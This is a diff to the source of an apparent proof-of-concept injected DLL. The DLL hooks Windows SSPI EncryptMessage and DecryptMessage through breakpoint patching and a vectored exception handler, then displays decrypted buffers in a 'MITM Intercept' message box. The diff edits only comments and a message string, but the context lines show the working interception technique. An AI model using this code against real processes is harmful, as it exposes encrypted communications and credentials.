@@ -4,6 +4,7 @@
 #include <stdio.h>
 #include <Sspi.h> //Be sure to reference secur32.lib in Linker | Input | Additional Dependencies
 
+//Fix this, doesn't scale...
 
 FARPROC fpEncryptMessage; //Pointer To The Original Location
 BYTE bSavedByte; //Saved Byte Overwritten by 0xCC -
@@ -28,6 +29,7 @@ BOOL WriteMemory(FARPROC fpFunc, LPCBYTE b, SIZE_T size) {
 	return VirtualProtect(fpFunc, size, dwOldProt, &dwOldProt);
 }
 
+//TODO, Combine  HOOK Function To take 2 params. DLL and Function Name.
 VOID HookFunction(VOID) {
 	fpEncryptMessage = GetProcAddress(LoadLibrary(L"sspicli.dll"), "EncryptMessage");
 	if (fpEncryptMessage == NULL) {
@@ -85,14 +87,13 @@ SECURITY_STATUS MyDecryptMessage(
 )
 {
 	
-	
 	if (WriteMemory(fpDecryptMessage, &bSavedByte2, sizeof(BYTE)) == FALSE) {
 		ExitThread(0);
 	}
 
 	SECURITY_STATUS SEC_EntryRet = DecryptMessage(phContext, pMessage, MessageSeqNo, &fQOP );
 
-	char* buffer = (char*)(pMessage->pBuffers->pvBuffer); //Just Hardcode for PoC
+	char* buffer = (char*)(pMessage->pBuffers->pvBuffer); 
 
 	::MessageBoxA(NULL, buffer, "MITM Intercept", 0);
 
@@ -131,7 +132,7 @@ BOOL APIENTRY DllMain(HANDLE hInstance, DWORD fdwReason, LPVOID lpReserved) {
 		AddVectoredExceptionHandler(1, (PVECTORED_EXCEPTION_HANDLER)MyVectoredExceptionHandler1);
 		HookFunction();
 		HookFunction2();
-		::MessageBoxA(NULL, "Boom!", "Injected", 0);
+		::MessageBoxA(NULL, "Locked and Loaded!", "Boom!", 0);
 		break;
 	}
 
